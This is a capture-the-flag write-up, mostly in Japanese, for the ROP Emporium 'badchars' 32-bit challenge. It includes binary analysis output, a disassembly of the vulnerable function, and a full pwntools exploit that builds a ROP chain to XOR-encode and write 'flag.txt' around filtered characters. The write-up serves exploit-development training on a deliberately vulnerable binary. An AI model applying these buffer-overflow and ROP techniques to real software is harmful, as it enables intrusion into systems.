# badchars x86

## Description

```
An arbitrary write challenge with a twist; certain input characters get mangled as they make their way onto the stack.
Find a way to deal with this and craft your exploit.

Click below to download the binary:
https://ropemporium.com/binary/badchars32.zip
```

### The good, the bad

Dealing with bad characters is frequently necessary in exploit development, you've probably had to deal with them before while encoding shellcode. "Badchars" are the reason that encoders such as shikata-ga-nai exist. When constructing your ROP chain remember that the badchars apply to *every* character you use, not just parameters but addresses too. **To mitigate the need for too much RE the binary will list its badchars when you run it.**

### Options

ropper has a bad characters option to help you avoid using gadgets whose address will terminate your chain prematurely, it will certainly come in handy. **Note that the amount of garbage data you'll need to send to the ARM challenge is slightly different.**

### Moar XOR

You'll still need to deal with writing a string into memory, similar to the write4 challenge, that may have badchars in it. Once your string is in memory and intact, just use the `print_file()` method to print the contents of the flag file, just like in the last challenge. Think about how we're going to overcome the badchars issue; should we try to avoid them entirely, or could we use gadgets to change our string once it's in memory?

### Helper functions

It's almost certainly worth your time writing a helper function for this challenge. Perhaps one that takes as parameters a string, a desired location in memory and an array of badchars. It could then write the string into memory and deal with the badchars afterwards. There's always a chance you could find a string that does what you want and doesn't contain any badchars either.

## Solution

とりあえず表層解析をしてみる

```
✦ ❯ file badchars32 
badchars32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=48ae8ea56ad3b3ef64444a622db86aa4f0f26b7d, not stripped
```

```
✦ ❯ checksec --file=badchars32 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   68) Symbols	  No	0		0badchars32
```

```
✦ ❯ nm badchars32 
0804a020 B __bss_start
0804a020 b completed.7283
0804a018 D __data_start
0804a018 W data_start
08048450 t deregister_tm_clones
08048430 T _dl_relocate_static_pie
080484d0 t __do_global_dtors_aux
08049f00 d __do_global_dtors_aux_fini_array_entry
0804a01c D __dso_handle
08049f04 d _DYNAMIC
0804a020 D _edata
0804a024 B _end
080485c4 T _fini
080485d8 R _fp_hw
08048500 t frame_dummy
08049efc d __frame_dummy_init_array_entry
08048740 r __FRAME_END__
0804a000 d _GLOBAL_OFFSET_TABLE_
         w __gmon_start__
080485ec r __GNU_EH_FRAME_HDR
0804837c T _init
08049f00 d __init_array_end
08049efc d __init_array_start
080485dc R _IO_stdin_used
080485c0 T __libc_csu_fini
08048560 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
08048506 T main
         U print_file
         U pwnme
08048490 t register_tm_clones
080483f0 T _start
0804a020 D __TMC_END__
0804852a t usefulFunction
08048543 t usefulGadgets
08048440 T __x86.get_pc_thunk.bx

```



なんか前のwirite4の改良版ぽいのでそれと似た感じで攻めていく。

とりあえず、それぞれのセクションの権限見ていくか。

```
There are 30 section headers, starting at offset 0x17a4:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.bu[...] NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00003c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481e8 0001e8 0000b0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          08048298 000298 00008d 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          08048326 000326 000016 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         0804833c 00033c 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             0804835c 00035c 000008 08   A  5   0  4
  [10] .rel.plt          REL             08048364 000364 000018 08  AI  5  23  4
  [11] .init             PROGBITS        0804837c 00037c 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080483a0 0003a0 000040 04  AX  0   0 16
  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 08  AX  0   0  8
  [14] .text             PROGBITS        080483f0 0003f0 0001d2 00  AX  0   0 16
  [15] .fini             PROGBITS        080485c4 0005c4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080485d8 0005d8 000014 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        080485ec 0005ec 000044 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048630 000630 000114 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049efc 000efc 000004 04  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f00 000f00 000004 04  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f04 000f04 0000f8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
  [26] .comment          PROGBITS        00000000 001020 000029 01  MS  0   0  1
  [27] .symtab           SYMTAB          00000000 00104c 000440 10     28  47  4
  [28] .strtab           STRTAB          00000000 00148c 000213 00      0   0  1
  [29] .shstrtab         STRTAB          00000000 00169f 000105 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)

```

.dataに書き込んでいくかぁ

pwnmeのディスアセンブルしたものを見てみると,

```
gef➤  disas
Dump of assembler code for function pwnme:
   0xf7fc26bd <+0>:	push   ebp
   0xf7fc26be <+1>:	mov    ebp,esp
   0xf7fc26c0 <+3>:	push   ebx
=> 0xf7fc26c1 <+4>:	sub    esp,0x34
   0xf7fc26c4 <+7>:	call   0xf7fc25c0 <__x86.get_pc_thunk.bx>
   0xf7fc26c9 <+12>:	add    ebx,0x1937
   0xf7fc26cf <+18>:	mov    eax,DWORD PTR [ebx-0x8]
   0xf7fc26d5 <+24>:	mov    eax,DWORD PTR [eax]
   0xf7fc26d7 <+26>:	push   0x0
   0xf7fc26d9 <+28>:	push   0x2
   0xf7fc26db <+30>:	push   0x0
   0xf7fc26dd <+32>:	push   eax
   0xf7fc26de <+33>:	call   0xf7fc2580 <setvbuf@plt>
   0xf7fc26e3 <+38>:	add    esp,0x10
   0xf7fc26e6 <+41>:	sub    esp,0xc
   0xf7fc26e9 <+44>:	lea    eax,[ebx-0x1784]
   0xf7fc26ef <+50>:	push   eax
   0xf7fc26f0 <+51>:	call   0xf7fc2560 <puts@plt>
   0xf7fc26f5 <+56>:	add    esp,0x10
   0xf7fc26f8 <+59>:	sub    esp,0xc
   0xf7fc26fb <+62>:	lea    eax,[ebx-0x176b]
   0xf7fc2701 <+68>:	push   eax
   0xf7fc2702 <+69>:	call   0xf7fc2560 <puts@plt>
   0xf7fc2707 <+74>:	add    esp,0x10
   0xf7fc270a <+77>:	sub    esp,0x4
   0xf7fc270d <+80>:	push   0x20
   0xf7fc270f <+82>:	push   0x0
   0xf7fc2711 <+84>:	lea    eax,[ebp-0x38]
   0xf7fc2714 <+87>:	add    eax,0x10
   0xf7fc2717 <+90>:	push   eax
   0xf7fc2718 <+91>:	call   0xf7fc25a0 <memset@plt>
   0xf7fc271d <+96>:	add    esp,0x10
   0xf7fc2720 <+99>:	sub    esp,0xc
   0xf7fc2723 <+102>:	lea    eax,[ebx-0x1764]
   0xf7fc2729 <+108>:	push   eax
   0xf7fc272a <+109>:	call   0xf7fc2560 <puts@plt>
   0xf7fc272f <+114>:	add    esp,0x10
   0xf7fc2732 <+117>:	sub    esp,0xc
   0xf7fc2735 <+120>:	lea    eax,[ebx-0x1743]
   0xf7fc273b <+126>:	push   eax
   0xf7fc273c <+127>:	call   0xf7fc2530 <printf@plt>
   0xf7fc2741 <+132>:	add    esp,0x10
   0xf7fc2744 <+135>:	sub    esp,0x4
   0xf7fc2747 <+138>:	push   0x200
   0xf7fc274c <+143>:	lea    eax,[ebp-0x38]
   0xf7fc274f <+146>:	add    eax,0x10
   0xf7fc2752 <+149>:	push   eax
   0xf7fc2753 <+150>:	push   0x0
   0xf7fc2755 <+152>:	call   0xf7fc2520 <read@plt>
   0xf7fc275a <+157>:	add    esp,0x10
   0xf7fc275d <+160>:	mov    DWORD PTR [ebp-0x38],eax
   0xf7fc2760 <+163>:	mov    DWORD PTR [ebp-0x34],0x0
   0xf7fc2767 <+170>:	jmp    0xf7fc27ad <pwnme+240>
   0xf7fc2769 <+172>:	mov    DWORD PTR [ebp-0x30],0x0
   0xf7fc2770 <+179>:	jmp    0xf7fc279c <pwnme+223>
   0xf7fc2772 <+181>:	mov    eax,DWORD PTR [ebp-0x34]
   0xf7fc2775 <+184>:	movzx  ecx,BYTE PTR [ebp+eax*1-0x28]
   0xf7fc277a <+189>:	mov    eax,DWORD PTR [ebp-0x30]
   0xf7fc277d <+192>:	mov    edx,DWORD PTR [ebx-0x10]
   0xf7fc2783 <+198>:	movzx  eax,BYTE PTR [edx+eax*1]
   0xf7fc2787 <+202>:	cmp    cl,al
   0xf7fc2789 <+204>:	jne    0xf7fc2793 <pwnme+214>
   0xf7fc278b <+206>:	mov    eax,DWORD PTR [ebp-0x34]
   0xf7fc278e <+209>:	mov    BYTE PTR [ebp+eax*1-0x28],0xeb
   0xf7fc2793 <+214>:	mov    eax,DWORD PTR [ebp-0x30]
   0xf7fc2796 <+217>:	add    eax,0x1
   0xf7fc2799 <+220>:	mov    DWORD PTR [ebp-0x30],eax
   0xf7fc279c <+223>:	mov    eax,DWORD PTR [ebp-0x30]
   0xf7fc279f <+226>:	cmp    eax,0x3
   0xf7fc27a2 <+229>:	jbe    0xf7fc2772 <pwnme+181>
   0xf7fc27a4 <+231>:	mov    eax,DWORD PTR [ebp-0x34]
   0xf7fc27a7 <+234>:	add    eax,0x1
   0xf7fc27aa <+237>:	mov    DWORD PTR [ebp-0x34],eax
   0xf7fc27ad <+240>:	mov    edx,DWORD PTR [ebp-0x34]
   0xf7fc27b0 <+243>:	mov    eax,DWORD PTR [ebp-0x38]
   0xf7fc27b3 <+246>:	cmp    edx,eax
   0xf7fc27b5 <+248>:	jb     0xf7fc2769 <pwnme+172>
   0xf7fc27b7 <+250>:	sub    esp,0xc
   0xf7fc27ba <+253>:	lea    eax,[ebx-0x1740]
   0xf7fc27c0 <+259>:	push   eax
   0xf7fc27c1 <+260>:	call   0xf7fc2560 <puts@plt>
   0xf7fc27c6 <+265>:	add    esp,0x10
   0xf7fc27c9 <+268>:	nop
   0xf7fc27ca <+269>:	mov    ebx,DWORD PTR [ebp-0x4]
   0xf7fc27cd <+272>:	leave  
   0xf7fc27ce <+273>:	ret    
End of assembler dump.
```

read(0,ebp-0x28,0x200)なので、44文字入力してからアドレス指定するとeip取れる？

pwnmeを二回実行させるようにしてみる

```
✦ ❯ cat input | ./badchars32 
badchars by ROP Emporium
x86

badchars are: 'x', 'g', 'a', '.'
> Thank you!
badchars by ROP Emporium
x86

badchars are: 'x', 'g', 'a', '.'
> Thank you!
fish: Process 11845, './badchars32' from job 2, 'cat input | ./badchars32' terminated by signal SIGSEGV (Address boundary error)

```

できたぁ。



とりま疑似コードに出してみるか

```
pwnme(){
	puts("badchars by ROP Emporium\nx86\n")
	memset(ebp-0x28,0,0x20)
	puts(""badchars are: 'x', 'g', 'a', '.'")
	printf("> ")
	*(ebp-0x38) = read(0,ebp-0x28,0x200)
	*(ebp-0x34) = 0 // countの役割？　(count1)
	*(ebp-0x30) = 0　//countの役割？ (count2)
	
	do{
		*(ebp-0x30) = 0
		for(;;){
			if(*(ebp-0x30) <= 0x3){ //四回ループしてる？
				ecx = *(ebp + *(ebp-0x34)*1-0x28)　// １文字目が入ってるぽい
				eax = *(ebp-0x30) //カウントの役割？
				edx = *(ebx-0x10)
				eax = *(edx+eax*1) 
				// 0x78	0x67 0x61 0x2eの順？最初の
				//'x','g','a','.'の比較してた
				// 文字列比較？ 
				if(eax == ecx){
					
                    = 0xeb
				}
				*(ebp-0x30)++;   //4回ループ
			}else{
				*(ebp-0x34)++
				if(*(ebp-0x34) >= *(ebp-0x38)){
					puts("thank you")
					return
				}
			}
		}
		
	} while(*(ebp-0x34) < *(ebp-0x38)))
}
```

```
badchars are: 'x', 'g', 'a', '.'
```

とあるので、どうにかここらへんの文字を使わずに

print_file()に"flag.txt"を渡したい。

なんかDescriptionにMoar XORとあるので、最初にxorした値を入力すれば良さそう？

とりあえず、今までと同じように、ropgadgetでメモリに値を入れられるやつを探すようにする

使えるやつがあった

```
0x0804854f : mov dword ptr [edi], esi ; ret
0x080485b9 : pop esi ; pop edi ; pop ebp ; ret
```

xorしてもう一回、xorすればいい感じに戻るのでそれをしたあげようか。

いい感じのやつがあった。

```
0x08048547 : xor byte ptr [ebp], bl ; ret
0x080485bb : pop ebp ; ret
0x0804839d : pop ebx ; ret
```



無事行けたぜよ

```
❯ python3 solve.py
[*] '/mnt/nvme0n1p7/security/rop-emporium/badchars32/badchars32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'
[+] Starting local process './badchars32': pid 19951
[+] Receiving all data: Done (109B)
[*] Process './badchars32' stopped with exit code -11 (SIGSEGV) (pid 19951)
b"badchars by ROP Emporium\nx86\n\nbadchars are: 'x', 'g', 'a', '.'\n> Thank you!\nROPE{a_placeholder_32byte_flag!}\n"
```

```
from pwn import *
import pwn

BINARY = './badchars32'

context.os = "linux"
context.arch = "i386"
context.binary = BINARY
# address 
pwnme = 0x080483b0
data_section =  0x0804a018 # .data section
print_file = 0x080483d0 #print_file(data)
# gadget
pop_esi_edi_ebp = 0x080485b9 # pop esi; pop edi; pop ebp; ret;
mov_ptr_edi_esi = 0x0804854f # mov dword ptr [edi], esi ; ret
xor_ebp_bl = 0x08048547 # xor byte ptr [ebp], bl ; ret
pop_ebx = 0x0804839d #pop ebx ; ret
pop_ebp = 0x080485bb # pop ebp ; ret

p = process(BINARY)
def xor_data(data,key):
    return bytes([data[i] ^ key for i in range(len(data))])

def output(data):
    open('./input', 'wb').write(data)

def xor_loop_rop():
    rop = b''
    for i in range(len("flag.txt")):
        rop += p32(pop_ebp)
        rop += p32(data_section+i)
        rop += p32(pop_ebx)
        rop += p32(0x00000002)
        rop += p32(xor_ebp_bl)
    return rop

def payload():
    rop = b'A' * 44
    rop += p32(pop_esi_edi_ebp)
    rop += xor_data(b'flag',2)
    rop += p32(data_section)
    rop += b'BBBB'
    rop += p32(mov_ptr_edi_esi)
    rop += p32(pop_esi_edi_ebp)
    rop += xor_data(b'.txt',2)
    rop += p32(data_section+4)
    rop += b'BBBB'
    rop += p32(mov_ptr_edi_esi)
    
    rop += xor_loop_rop()

    rop += p32(print_file)
    rop += b'BBBB'
    rop += p32(data_section)
    return rop


rop = payload()
p.sendline(rop)
flag = p.recvall()
print(flag)

output(rop)
```

